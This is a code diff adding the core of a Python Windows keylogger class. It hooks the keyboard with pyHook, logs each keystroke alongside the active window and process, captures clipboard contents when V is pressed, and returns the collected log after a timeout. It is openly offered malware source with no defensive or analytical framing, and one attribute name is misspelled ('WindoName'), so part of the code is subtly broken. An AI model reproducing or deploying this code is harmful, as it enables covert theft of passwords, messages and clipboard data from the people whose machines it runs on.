@@ -34,3 +34,41 @@ class KeyLogger:
         print("\n", process_id, executable.value.decode(), self.current_window)
         windll.kernel32.CloseHandle(hwnd)
         windll.kernel32.CloseHandle(h_process)
+
+    def mykeystroke(self, event):
+        if event.WindoName != self.current_window:
+            self.get_current_process()
+
+        if 32 < event.Ascii < 127:
+            print(chr(event.Ascii), end="")
+        else:
+            if event.Key == "V":
+                win32clipboard.OpenClipboard()
+                value = win32clipboard.GetClipboardData()
+                win32clipboard.CloseClipboard()
+                print(f"[Paste] - {value}")
+
+            else:
+                print(f"{event.Key}")
+
+        return True
+
+
+def run():
+    save_stdout = sys.stdout
+    sys.stdout = StringIO()
+    kl = KeyLogger()
+    hm = pyHook.HookManager()
+    hm.KeyDown = kl.mykeystroke
+    hm.HookKeyboard()
+    while time.thread_time() < TIMEOUT:
+        pythoncom.PumpWaitingMessages()
+
+    log = sys.stdout.getvalue()
+    sys.stdout = save_stdout
+    return log
+
+
+if __name__ == "__main__":
+    print(run())
+    print("done.")
